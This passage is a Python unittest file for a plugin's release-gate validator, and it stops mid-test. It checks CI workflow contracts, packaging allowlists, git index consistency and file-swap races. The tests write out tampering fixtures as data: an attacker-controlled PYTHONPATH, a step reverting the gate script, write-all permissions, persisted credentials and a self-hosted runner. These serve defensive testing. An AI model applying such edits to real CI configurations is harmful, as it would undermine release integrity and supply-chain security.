from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from contextlib import contextmanager
from pathlib import Path
from types import SimpleNamespace
from typing import Iterator
from unittest.mock import patch


PLUGIN_ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = PLUGIN_ROOT / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import release_gate  # noqa: E402


def _run_git(
    root: Path,
    *arguments: str,
    env: dict[str, str] | None = None,
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *arguments],
        cwd=root,
        env=env,
        text=True,
        encoding="utf-8",
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )


def _init_git(root: Path) -> None:
    _run_git(root, "init", "--quiet")
    _run_git(root, "config", "core.autocrlf", "false")


def _stage(root: Path, *relative_paths: str) -> None:
    _run_git(root, "add", "--", *relative_paths)


def _install_fixture(root: Path) -> tuple[Path, Path]:
    source = root / "source"
    installed = root / "installed"
    (source / ".codex-plugin").mkdir(parents=True)
    (source / "scripts").mkdir()
    (source / ".codex-plugin" / "plugin.json").write_text(
        json.dumps({"name": "plot-rag-gate", "version": "1.4.2"}),
        encoding="utf-8",
    )
    (source / "scripts" / "runtime.py").write_text(
        "STATE = 'same'\n",
        encoding="utf-8",
    )
    _init_git(source)
    _stage(
        source,
        ".codex-plugin/plugin.json",
        "scripts/runtime.py",
    )
    shutil.copytree(
        source,
        installed,
        ignore=shutil.ignore_patterns(".git"),
    )
    return source, installed


def _index_bytes(root: Path, relative: str) -> bytes:
    return subprocess.run(
        ["git", "show", f":{relative}"],
        cwd=root,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    ).stdout


def _windows_short_path(path: Path) -> Path:
    if os.name != "nt":
        return path
    import ctypes
    from ctypes import wintypes

    get_short_path = ctypes.WinDLL("kernel32", use_last_error=True).GetShortPathNameW
    get_short_path.argtypes = [
        wintypes.LPCWSTR,
        wintypes.LPWSTR,
        wintypes.DWORD,
    ]
    get_short_path.restype = wintypes.DWORD
    buffer = ctypes.create_unicode_buffer(32768)
    length = get_short_path(str(path), buffer, len(buffer))
    if length == 0 or length >= len(buffer):
        return path
    return Path(buffer.value)


@contextmanager
def _staged_worktree_index(root: Path) -> Iterator[None]:
    with tempfile.TemporaryDirectory(prefix="plot-rag-test-index-") as temporary:
        index_path = Path(temporary) / "index"
        environment = dict(os.environ)
        environment["GIT_INDEX_FILE"] = str(index_path)
        _run_git(root, "read-tree", "HEAD", env=environment)
        _run_git(root, "add", "-A", env=environment)
        with patch.dict(
            os.environ,
            {"GIT_INDEX_FILE": str(index_path)},
            clear=False,
        ):
            yield


def _copy_v15_contract_surface(root: Path) -> None:
    shutil.copytree(PLUGIN_ROOT / "schemas", root / "schemas")
    for relative in (
        "scripts/state_rag.py",
        "scripts/continuity/schema.py",
        "scripts/continuity/validators.py",
        "scripts/continuity/items.py",
    ):
        source = PLUGIN_ROOT / relative
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, target)


def _copy_source_manifest_contract_surface(root: Path) -> None:
    for relative in release_gate.SOURCE_MANIFEST_REQUIRED_SOURCE_PATHS:
        source = PLUGIN_ROOT / relative
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, target)


def _copy_power_spec_contract_surface(root: Path) -> None:
    for relative in release_gate.POWER_SPEC_REQUIRED_SOURCE_PATHS:
        source = PLUGIN_ROOT / relative
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, target)


class ReleaseGateTests(unittest.TestCase):
    def test_repository_release_surface_is_self_consistent(self) -> None:
        with _staged_worktree_index(PLUGIN_ROOT):
            issues = release_gate.validate_source(PLUGIN_ROOT)
        self.assertEqual([], issues)

    def test_ci_contract_does_not_accept_required_commands_in_comments(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            workflow = root / ".github" / "workflows" / "ci.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text(
                "\n".join(
                    [
                        "# permissions:",
                        "# contents: read",
                        "# fetch-depth: 0",
                        *[
                            f"# {command}"
                            for commands in (
                                release_gate.CI_REQUIRED_JOB_COMMANDS.values()
                            )
                            for command in commands
                        ],
                    ]
                )
                + "\n",
                encoding="utf-8",
            )

            issues = release_gate._validate_ci(root)

        self.assertIn("CI_GATE_MISSING", {issue.code for issue in issues})

    def test_ci_contract_requires_all_release_triggers(self) -> None:
        source = (
            PLUGIN_ROOT / ".github" / "workflows" / "ci.yml"
        ).read_text(encoding="utf-8")
        weakened = source.replace(
            "on:\n  push:\n  pull_request:\n  workflow_dispatch:\n",
            "on:\n  workflow_dispatch:\n",
            1,
        )
        self.assertNotEqual(source, weakened)
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            workflow = root / ".github" / "workflows" / "ci.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text(weakened, encoding="utf-8")

            issues = release_gate._validate_ci(root)

        trigger_issues = [
            issue for issue in issues if issue.code == "CI_TRIGGER_MISSING"
        ]
        self.assertEqual(1, len(trigger_issues))
        self.assertIn("pull_request", trigger_issues[0].message)
        self.assertIn("push", trigger_issues[0].message)

    def test_ci_contract_rejects_push_branch_filters(self) -> None:
        source = (
            PLUGIN_ROOT / ".github" / "workflows" / "ci.yml"
        ).read_text(encoding="utf-8")
        weakened = source.replace(
            "  push:\n",
            "  push:\n    branches-ignore: ['**']\n",
            1,
        )
        self.assertNotEqual(source, weakened)
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            workflow = root / ".github" / "workflows" / "ci.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text(weakened, encoding="utf-8")

            issues = release_gate._validate_ci(root)

        self.assertTrue(
            any(
                issue.code == "CI_TRIGGER_FILTERED"
                and "'push'" in issue.message
                and "branches-ignore" in issue.message
                for issue in issues
            )
        )

    def test_ci_contract_rejects_pull_request_path_filters(self) -> None:
        source = (
            PLUGIN_ROOT / ".github" / "workflows" / "ci.yml"
        ).read_text(encoding="utf-8")
        weakened = source.replace(
            "  pull_request:\n",
            "  pull_request:\n    paths-ignore: ['**']\n",
            1,
        )
        self.assertNotEqual(source, weakened)
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            workflow = root / ".github" / "workflows" / "ci.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text(weakened, encoding="utf-8")

            issues = release_gate._validate_ci(root)

        self.assertTrue(
            any(
                issue.code == "CI_TRIGGER_FILTERED"
                and "'pull_request'" in issue.message
                and "paths-ignore" in issue.message
                for issue in issues
            )
        )

    def test_ci_contract_rejects_job_level_continue_on_error(self) -> None:
        source = (
            PLUGIN_ROOT / ".github" / "workflows" / "ci.yml"
        ).read_text(encoding="utf-8")
        weakened = source.replace(
            "  test:\n",
            "  test:\n    continue-on-error: true\n",
            1,
        )
        self.assertNotEqual(source, weakened)
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            workflow = root / ".github" / "workflows" / "ci.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text(weakened, encoding="utf-8")

            issues = release_gate._validate_ci(root)

        self.assertTrue(
            any(
                issue.code == "CI_GATE_NON_BLOCKING"
                and "job-level continue-on-error" in issue.message
                for issue in issues
            )
        )

    def test_ci_contract_parses_space_before_mapping_colon(self) -> None:
        source = (
            PLUGIN_ROOT / ".github" / "workflows" / "ci.yml"
        ).read_text(encoding="utf-8")
        weakened = source.replace(
            "  test:\n",
            "  test:\n    continue-on-error : true\n",
            1,
        )
        self.assertNotEqual(source, weakened)
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            workflow = root / ".github" / "workflows" / "ci.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text(weakened, encoding="utf-8")

            issues = release_gate._validate_ci(root)

        self.assertTrue(
            any(
                issue.code == "CI_GATE_NON_BLOCKING"
                and "job-level continue-on-error" in issue.message
                for issue in issues
            )
        )

    def test_ci_contract_rejects_duplicate_top_level_sections(self) -> None:
        source = (
            PLUGIN_ROOT / ".github" / "workflows" / "ci.yml"
        ).read_text(encoding="utf-8")
        duplicates = {
            "on": source.replace(
                "permissions:\n",
                "on:\n  workflow_dispatch:\n\npermissions:\n",
                1,
            ),
            "permissions": source.replace(
                "jobs:\n",
                "permissions:\n  contents: read\n\njobs:\n",
                1,
            ),
            "jobs": source + "\njobs:\n  noop:\n    runs-on: ubuntu-latest\n",
        }
        for section, weakened in duplicates.items():
            with self.subTest(section=section):
                self.assertNotEqual(source, weakened)
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    workflow = root / ".github" / "workflows" / "ci.yml"
                    workflow.parent.mkdir(parents=True)
                    workflow.write_text(weakened, encoding="utf-8")

                    issues = release_gate._validate_ci(root)

                self.assertTrue(
                    any(
                        issue.code == "CI_WORKFLOW_INVALID"
                        and f"duplicate top-level key '{section}'"
                        in issue.message
                        for issue in issues
                    )
                )

    def test_ci_contract_parses_quoted_protected_keys(self) -> None:
        source = (
            PLUGIN_ROOT / ".github" / "workflows" / "ci.yml"
        ).read_text(encoding="utf-8")
        variants = {
            "job_if": (
                source.replace(
                    "  test:\n",
                    '  test:\n    "if": false\n',
                    1,
                ),
                "CI_GATE_CONDITIONAL",
            ),
            "step_continue": (
                source.replace(
                    (
                        "        run: python -B -X utf8 "
                        "scripts/release_gate.py roundtrip --root ."
                    ),
                    (
                        "        'continue-on-error': true\n"
                        "        run: python -B -X utf8 "
                        "scripts/release_gate.py roundtrip --root ."
                    ),
                    1,
                ),
                "CI_GATE_NON_BLOCKING",
            ),
        }
        for name, (weakened, expected_code) in variants.items():
            with self.subTest(name=name):
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    workflow = root / ".github" / "workflows" / "ci.yml"
                    workflow.parent.mkdir(parents=True)
                    workflow.write_text(weakened, encoding="utf-8")

                    issues = release_gate._validate_ci(root)

                self.assertIn(expected_code, {issue.code for issue in issues})

    def test_ci_contract_rejects_permission_and_execution_overrides(self) -> None:
        source = (
            PLUGIN_ROOT / ".github" / "workflows" / "ci.yml"
        ).read_text(encoding="utf-8")
        variants = {
            "top_id_token": (
                source.replace(
                    "  contents: read\n",
                    "  contents: read\n  id-token: write\n",
                    1,
                ),
                "CI_GATE_MISSING",
            ),
            "job_write_all": (
                source.replace(
                    "  release-gates:\n",
                    "  release-gates:\n    permissions: write-all\n",
                    1,
                ),
                "CI_PERMISSION_ESCALATION",
            ),
            "job_nested_write": (
                source.replace(
                    "  release-gates:\n",
                    (
                        "  release-gates:\n"
                        "    permissions:\n"
                        "      contents: write\n"
                    ),
                    1,
                ),
                "CI_PERMISSION_ESCALATION",
            ),
            "checkout_ref": (
                source.replace(
                    "          fetch-depth: 0\n",
                    "          fetch-depth: 0\n          ref: old-release\n",
                    1,
                ),
                "CI_GATE_MISSING",
            ),
            "checkout_credentials": (
                source.replace(
                    "          persist-credentials: false\n",
                    "          persist-credentials: true\n",
                    1,
                ),
                "CI_GATE_MISSING",
            ),
            "checkout_old_major": (
                source.replace(
                    (
                        "actions/checkout@"
                        "9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0"
                    ),
                    "actions/checkout@v6",
                    1,
                ),
                "CI_GATE_MISSING",
            ),
            "run_shell": (
                source.replace(
                    (
                        "        run: python -B -X utf8 "
                        "scripts/release_gate.py roundtrip --root ."
                    ),
                    (
                        "        shell: echo\n"
                        "        run: python -B -X utf8 "
                        "scripts/release_gate.py roundtrip --root ."
                    ),
                    1,
                ),
                "CI_GATE_EXECUTION_OVERRIDE",
            ),
            "run_working_directory": (
                source.replace(
                    (
                        "        run: python -B -X utf8 "
                        "scripts/release_gate.py roundtrip --root ."
                    ),
                    (
                        "        working-directory: safe-old-tree\n"
                        "        run: python -B -X utf8 "
                        "scripts/release_gate.py roundtrip --root ."
                    ),
                    1,
                ),
                "CI_GATE_EXECUTION_OVERRIDE",
            ),
        }
        for name, (weakened, expected_code) in variants.items():
            with self.subTest(name=name):
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    workflow = root / ".github" / "workflows" / "ci.yml"
                    workflow.parent.mkdir(parents=True)
                    workflow.write_text(weakened, encoding="utf-8")

                    issues = release_gate._validate_ci(root)

                self.assertIn(expected_code, {issue.code for issue in issues})

    def test_ci_contract_rejects_protected_job_structure_drift(self) -> None:
        source = (
            PLUGIN_ROOT / ".github" / "workflows" / "ci.yml"
        ).read_text(encoding="utf-8")
        variants = {
            "tamper_step": source.replace(
                (
                    "      - name: Validate plugin, skill, schema, version, "
                    "and CI contracts\n"
                ),
                (
                    "      - run: git checkout HEAD^ -- "
                    "scripts/release_gate.py\n"
                    "      - name: Validate plugin, skill, schema, version, "
                    "and CI contracts\n"
                ),
                1,
            ),
            "matrix_coverage": source.replace(
                "          - windows-latest\n",
                "",
                1,
            ),
            "warnings_ignored": source.replace(
                '          PYTHONWARNINGS: "error::ResourceWarning"\n',
                '          PYTHONWARNINGS: "ignore"\n',
                1,
            ),
            "job_pythonpath": source.replace(
                "  release-gates:\n",
                (
                    "  release-gates:\n"
                    "    env:\n"
                    "      PYTHONPATH: ./attacker\n"
                ),
                1,
            ),
            "self_hosted": source.replace(
                "    runs-on: ubuntu-latest\n",
                "    runs-on: self-hosted\n",
                1,
            ),
            "setup_python_old_major": source.replace(
                (
                    "actions/setup-python@"
                    "ece7cb06caefa5fff74198d8649806c4678c61a1"
                ),
                "actions/setup-python@v5",
                1,
            ),
        }
        for name, weakened in variants.items():
            with self.subTest(name=name):
                self.assertNotEqual(source, weakened)
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    workflow = root / ".github" / "workflows" / "ci.yml"
                    workflow.parent.mkdir(parents=True)
                    workflow.write_text(weakened, encoding="utf-8")

                    issues = release_gate._validate_ci(root)

                self.assertIn(
                    "CI_JOB_CONTRACT_INVALID",
                    {issue.code for issue in issues},
                )

    def test_untracked_release_files_are_rejected_and_not_packaged(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            (root / "scripts").mkdir()
            (root / "scripts" / "tracked.py").write_text(
                "tracked = True\n",
                encoding="utf-8",
            )
            (root / "untracked.py").write_text("untracked", encoding="utf-8")
            _stage(root, "scripts/tracked.py")

            issues = release_gate._validate_payload(root)
            tracked = release_gate.tracked_files(root)
            payload = release_gate.payload_files(root)

        self.assertEqual(("scripts/tracked.py",), tracked)
        self.assertEqual(("scripts/tracked.py",), payload)
        self.assertEqual(
            ["untracked.py"],
            [
                issue.path
                for issue in issues
                if issue.code == "PACKAGE_UNTRACKED_FILE"
            ],
        )

    def test_v15_migration_root_document_is_an_explicit_payload_member(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            (root / "V1_5_MIGRATION.md").write_bytes(
                b"# v1.5 migration\n"
            )
            _stage(root, "V1_5_MIGRATION.md")

            issues = release_gate._validate_payload(root)
            payload = release_gate.payload_files(root)

        self.assertEqual([], issues)
        self.assertEqual(("V1_5_MIGRATION.md",), payload)

    def test_benchmark_payload_uses_exact_source_and_fixture_allowlist(
        self,
    ) -> None:
        allowed = (
            "benchmarks/v15_live_e2e.py",
            "benchmarks/v15_performance.py",
            "benchmarks/fixtures/event_experience_annotations.v1.jsonl",
            "benchmarks/fixtures/item_function_annotations.v1.jsonl",
            "benchmarks/fixtures/remote_responses.v1.json",
            "benchmarks/fixtures/v15_performance_manifest.v1.json",
            "benchmarks/fixtures/v15_generic_live_prompts.v1.json",
        )
        rejected = "benchmarks/results.json"
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            (root / "benchmarks" / "fixtures").mkdir(parents=True)
            for relative in allowed:
                if relative.endswith(".py"):
                    (root / relative).write_bytes(b"RUNNER_VERSION = 1\n")
                elif relative.endswith(".jsonl"):
                    (root / relative).write_bytes(b'{"fixture": true}\n')
                else:
                    (root / relative).write_bytes(
                        b'{"manifest_version": 1}\n'
                    )
            (root / rejected).write_bytes(b'{"latency_ms": 1}\n')
            _stage(root, *allowed, rejected)

            issues = release_gate._validate_payload(root)
            payload = release_gate.payload_files(root)

        for relative in allowed:
            self.assertIn(relative, payload)
        self.assertNotIn(rejected, payload)
        self.assertTrue(
            any(
                issue.code == "PACKAGE_PATH_NOT_ALLOWED"
                and issue.path == rejected
                for issue in issues
            )
        )

    def test_runtime_noise_covers_pointer_databases_and_sidecars_without_hiding_release_fixtures(
        self,
    ) -> None:
        noisy = (
            ".plot-rag-current-project",
            ".plot-rag-init/init.sqlite3",
            ".plot-rag-benchmark/run/result.json",
            "tests/runtime.sqlite",
            "tests/runtime.sqlite-journal",
            "tests/runtime.sqlite-shm",
            "tests/runtime.sqlite-wal",
            "tests/runtime.sqlite3-journal",
            "tests/runtime.db-journal",
            "tests/runtime.db-shm",
            "tests/runtime.db-wal",
        )
        required = (
            "schemas/plot-rag-item/v1.schema.json",
            "schemas/plot-rag-delta/v4.schema.json",
            "benchmarks/v15_performance.py",
            "benchmarks/fixtures/v15_performance_manifest.v1.json",
        )

        for relative in noisy:
            with self.subTest(noisy=relative):
                self.assertTrue(release_gate._is_noise(relative))
        for relative in required:
            with self.subTest(required=relative):
                self.assertFalse(release_gate._is_noise(relative))
                self.assertTrue(release_gate._is_allowed_payload_file(relative))

    def test_payload_rejects_runtime_noise_but_keeps_required_schema_and_benchmark_fixture(
        self,
    ) -> None:
        required = (
            "schemas/plot-rag-item/v1.schema.json",
            "benchmarks/fixtures/v15_performance_manifest.v1.json",
        )
        noisy = (
            ".plot-rag-current-project",
            ".plot-rag-init/init.sqlite3-journal",
            ".plot-rag-benchmark/run/result.json",
            "tests/runtime.sqlite-wal",
            "tests/runtime.db-shm",
        )
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            for relative in required:
                path = root / relative
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(b"{}\n")
            for relative in noisy:
                path = root / relative
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text("runtime-only\n", encoding="utf-8")
            _stage(root, *required)
            _run_git(root, "add", "-f", "--", *noisy)

            issues = release_gate._validate_payload(root)
            payload = release_gate.payload_files(root)

        for relative in required:
            self.assertIn(relative, payload)
            self.assertFalse(
                any(issue.path == relative for issue in issues),
                relative,
            )
        for relative in noisy:
            self.assertNotIn(relative, payload)
            self.assertTrue(
                any(
                    issue.code == "PACKAGE_NOISE_TRACKED"
                    and issue.path == relative
                    for issue in issues
                ),
                relative,
            )

    def test_repository_gitignore_covers_runtime_pointer_and_database_sidecars(
        self,
    ) -> None:
        ignored = (
            ".plot-rag-current-project",
            ".plot-rag-init/init.sqlite3",
            ".plot-rag-benchmark/run/result.json",
            "runtime.sqlite",
            "runtime.sqlite-journal",
            "runtime.sqlite-shm",
            "runtime.sqlite-wal",
            "runtime.sqlite3-journal",
            "runtime.db-journal",
            "runtime.db-shm",
            "runtime.db-wal",
        )
        required = (
            "schemas/plot-rag-item/v1.schema.json",
            "benchmarks/fixtures/v15_performance_manifest.v1.json",
        )
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            shutil.copy2(PLUGIN_ROOT / ".gitignore", root / ".gitignore")
            for relative in (*ignored, *required):
                path = root / relative
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text("fixture\n", encoding="utf-8")

            ignored_result = _run_git(root, "check-ignore", "--", *ignored)
            required_result = subprocess.run(
                ["git", "check-ignore", "--", *required],
                cwd=root,
                text=True,
                encoding="utf-8",
                check=False,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

        self.assertEqual(set(ignored), set(ignored_result.stdout.splitlines()))
        self.assertEqual(1, required_result.returncode)
        self.assertEqual("", required_result.stdout)

    def test_tracked_scratch_file_is_rejected_and_excluded_from_payload(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            (root / "maintainer-scratch.txt").write_text(
                "local notes",
                encoding="utf-8",
            )
            _stage(root, "maintainer-scratch.txt")

            issues = release_gate._validate_payload(root)
            payload = release_gate.payload_files(root)

        self.assertIn(
            "PACKAGE_PATH_NOT_ALLOWED",
            {issue.code for issue in issues},
        )
        self.assertNotIn("maintainer-scratch.txt", payload)

    def test_payload_rejects_windows_ads_and_nonportable_components(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            entry = release_gate.TrackedPath(
                path="scripts/runtime.py:payload",
                mode="100644",
                stage=0,
                object_id="0" * 40,
            )
            with patch.object(
                release_gate,
                "_tracked_paths",
                return_value=(entry,),
            ):
                issues = release_gate._validate_payload(root)
                with self.assertRaisesRegex(
                    ValueError,
                    "not portable across release platforms",
                ):
                    release_gate.payload_files(root)

        self.assertTrue(
            any(
                issue.code == "PACKAGE_PATH_INVALID"
                and "Windows-invalid" in issue.message
                for issue in issues
            )
        )
        for value in (
            "scripts/CON.txt",
            "scripts/trailing.",
            "scripts/trailing ",
            "scripts/control\x01.py",
        ):
            with self.subTest(value=value):
                with self.assertRaisesRegex(ValueError, "not portable"):
                    release_gate._lexical_relative_path(value)

    def test_release_text_with_any_cr_byte_is_rejected(self) -> None:
        for relative in (
            ".codex-plugin/plugin.json",
            "benchmarks/fixtures/v15_performance_manifest.v1.json",
        ):
            for ending in (b"\r\n", b"\r"):
                with self.subTest(relative=relative, ending=ending):
                    with tempfile.TemporaryDirectory() as temporary:
                        root = Path(temporary)
                        _init_git(root)
                        path = root / relative
                        path.parent.mkdir(parents=True)
                        path.write_bytes(
                            b'{"name":"plot-rag-gate"}' + ending
                        )
                        _stage(root, relative)

                        issues = release_gate._validate_payload(root)

                    self.assertIn(
                        "PACKAGE_TEXT_EOL_MISMATCH",
                        {issue.code for issue in issues},
                    )

    def test_worktree_index_mismatch_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            path = root / "scripts" / "runtime.py"
            path.parent.mkdir()
            path.write_text("STATE = 'staged'\n", encoding="utf-8")
            _stage(root, "scripts/runtime.py")
            path.write_text("STATE = 'worktree'\n", encoding="utf-8")

            issues = release_gate._validate_payload(root)
            with self.assertRaisesRegex(
                ValueError,
                "PACKAGE_INDEX_WORKTREE_MISMATCH",
            ):
                release_gate.payload_files(root)

        self.assertIn(
            "PACKAGE_INDEX_WORKTREE_MISMATCH",
            {issue.code for issue in issues},
        )

    def test_payload_reader_rejects_identity_swap_before_open(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = _windows_short_path(Path(temporary))
            target = root / "scripts" / "runtime.py"
            replacement = root / "scripts" / "replacement.py"
            displaced = root / "scripts" / "runtime.original.py"
            target.parent.mkdir()
            target.write_text("STATE = 'expected'\n", encoding="utf-8")
            replacement.write_text("STATE = 'swapped'\n", encoding="utf-8")
            expected_target = target.resolve(strict=False)
            real_open = os.open
            swapped = False

            def swap_then_open(path, flags, mode=0o777):
                nonlocal swapped
                if (
                    Path(path).resolve(strict=False) == expected_target
                    and not swapped
                ):
                    swapped = True
                    target.replace(displaced)
                    replacement.replace(target)
                return real_open(path, flags, mode)

            with (
                patch.object(os, "open", side_effect=swap_then_open),
                self.assertRaisesRegex(ValueError, "changed identity"),
            ):
                release_gate._read_payload_bytes(root, "scripts/runtime.py")

    def test_cross_api_snapshot_uses_stable_birth_time(self) -> None:
        shared = {
            "st_dev": 1,
            "st_ino": 2,
            "st_mode": 0o100644,
            "st_size": 3,
            "st_mtime_ns": 4,
            "st_birthtime_ns": 5,
        }
        descriptor_stat = SimpleNamespace(**shared, st_ctime_ns=6)
        path_stat = SimpleNamespace(**shared, st_ctime_ns=7)
        replaced_stat = SimpleNamespace(
            **{**shared, "st_birthtime_ns": 8},
            st_ctime_ns=7,
        )

        self.assertEqual(
            release_gate._cross_api_stat_snapshot(descriptor_stat),
            release_gate._cross_api_stat_snapshot(path_stat),
        )
        self.assertNotEqual(
            release_gate._cross_api_stat_snapshot(descriptor_stat),
            release_gate._cross_api_stat_snapshot(replaced_stat),
        )

    def test_payload_reader_tolerates_cross_api_ctime_semantics(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            target = root / "scripts" / "runtime.py"
            target.parent.mkdir()
            expected = b"STATE = 'stable'\n"
            target.write_bytes(expected)
            path_stat = os.lstat(target)
            stable_birth = int(
                getattr(
                    path_stat,
                    "st_birthtime_ns",
                    path_stat.st_ctime_ns,
                )
            )
            real_fstat = os.fstat

            def descriptor_view(descriptor: int) -> SimpleNamespace:
                current = real_fstat(descriptor)
                return SimpleNamespace(
                    st_dev=current.st_dev,
                    st_ino=current.st_ino,
                    st_mode=current.st_mode,
                    st_size=current.st_size,
                    st_mtime_ns=current.st_mtime_ns,
                    st_ctime_ns=int(path_stat.st_ctime_ns) + 1,
                    st_birthtime_ns=stable_birth,
                    st_file_attributes=getattr(
                        current,
                        "st_file_attributes",
                        0,
                    ),
                )

            with patch.object(
                release_gate.os,
                "fstat",
                side_effect=descriptor_view,
            ):
                observed = release_gate._read_payload_bytes(
                    root,
                    "scripts/runtime.py",
                )

        self.assertEqual(expected, observed)

    def test_missing_git_index_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            path = root / "scripts" / "runtime.py"
            path.parent.mkdir()
            path.write_text("STATE = 'worktree-only'\n", encoding="utf-8")

            issues = release_gate._validate_payload(root)
            with self.assertRaisesRegex(
                RuntimeError,
                "PACKAGE_GIT_INDEX_UNAVAILABLE",
            ):
                release_gate.payload_files(root)

        self.assertEqual(
            ["PACKAGE_GIT_INDEX_UNAVAILABLE"],
            [issue.code for issue in issues],
        )

    def test_executable_git_mode_is_rejected_before_packaging(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            path = root / "scripts" / "runtime.py"
            path.parent.mkdir()
            path.write_text("STATE = 'portable'\n", encoding="utf-8")
            _stage(root, "scripts/runtime.py")
            _run_git(
                root,
                "update-index",
                "--chmod=+x",
                "scripts/runtime.py",
            )

            issues = release_gate._validate_payload(root)
            with self.assertRaisesRegex(
                ValueError,
                "PACKAGE_GIT_MODE_UNSUPPORTED",
            ):
                release_gate.payload_files(root)

        self.assertIn(
            "PACKAGE_GIT_MODE_UNSUPPORTED",
            {issue.code for issue in issues},
        )

    def test_tracked_symlink_mode_is_rejected_before_packaging(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "scripts").mkdir()
            (root / "scripts" / "release-notes.md").write_text(
                "../outside.md",
                encoding="utf-8",
            )
            _init_git(root)
            blob = subprocess.run(
                ["git", "hash-object", "-w", "--stdin"],
                cwd=root,
                input="../outside.md",
                text=True,
                encoding="utf-8",
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            ).stdout.strip()
            subprocess.run(
                [
                    "git",
                    "update-index",
                    "--add",
                    "--cacheinfo",
                    f"120000,{blob},scripts/release-notes.md",
                ],
                cwd=root,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            issues = release_gate._validate_payload(root)
            with self.assertRaisesRegex(ValueError, "PACKAGE_LINK_TRACKED"):
                release_gate.payload_files(root)

        self.assertIn(
            "PACKAGE_LINK_TRACKED",
            {issue.code for issue in issues},
        )

    def test_missing_tracked_payload_file_is_not_silently_omitted(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "scripts").mkdir()
            path = root / "scripts" / "missing.py"
            path.write_text("VALUE = 1\n", encoding="utf-8")
            _init_git(root)
            _stage(root, "scripts/missing.py")
            path.unlink()

            issues = release_gate._validate_payload(root)
            with self.assertRaisesRegex(
                ValueError,
                "PACKAGE_TRACKED_FILE_MISSING",
            ):
                release_gate.payload_files(root)

        self.assertIn(
            "PACKAGE_TRACKED_FILE_MISSING",
            {issue.code for issue in issues},
        )

    def test_semver_build_metadata_uses_the_same_base_version(self) -> None:
        self.assertEqual(
            "1.4.1",
            release_gate._semantic_base("1.4.1+codex.20260716160000"),
        )
        self.assertIsNone(release_gate._semantic_base("1.4"))

    def test_v15_release_contract_accepts_checked_in_defaults(self) -> None:
        config = json.loads(
            (PLUGIN_ROOT / "templates" / "config.v3.json").read_text(
                encoding="utf-8"
            )
        )

        issues = release_gate._validate_v15_contract(PLUGIN_ROOT, config)

        self.assertEqual([], issues)

    def test_source_manifest_release_contract_accepts_checked_in_surface(
        self,
    ) -> None:
        self.assertEqual(
            [],
            release_gate._validate_source_manifest_contract(PLUGIN_ROOT),
        )

    def test_source_manifest_release_contract_rejects_false_read_only(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _copy_source_manifest_contract_surface(root)
            mcp_path = root / "scripts" / "plot_rag_mcp.py"
            text = mcp_path.read_text(encoding="utf-8")
            old = """\
    _tool(
        "propose_source_manifest_change",
        (
"""
            new = """\
    _tool(
        "propose_source_manifest_change",
        (
"""
            self.assertIn(old, text)
            marker = """\
        (
            "project_root",
            "plan",
            "expected_canon_revision",
            "idempotency_key",
        ),
    ),
"""
            replacement = marker.replace(
                "        ),\n    ),\n",
                "        ),\n        read_only=True,\n    ),\n",
            )
            self.assertIn(marker, text)
            mcp_path.write_text(
                text.replace(old, new, 1).replace(marker, replacement, 1),
                encoding="utf-8",
            )

            issues = release_gate._validate_source_manifest_contract(root)

            self.assertIn(
                "SOURCE_MANIFEST_MCP_CONTRACT_MISMATCH",
